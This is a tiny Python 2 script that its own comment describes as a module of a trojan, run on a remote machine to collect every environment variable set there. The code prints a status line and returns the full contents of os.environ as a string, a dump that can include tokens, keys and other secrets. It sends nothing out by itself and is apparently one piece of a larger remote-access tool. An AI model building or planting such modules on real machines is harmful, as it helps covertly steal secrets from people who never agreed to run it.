#!/bin/python
#Purpose: retrieves any env variables that are set on the remote machine on which the trojan is executing
import os

def run(**args):
    print "[*] In enviroment module."
    return str(os.environ)
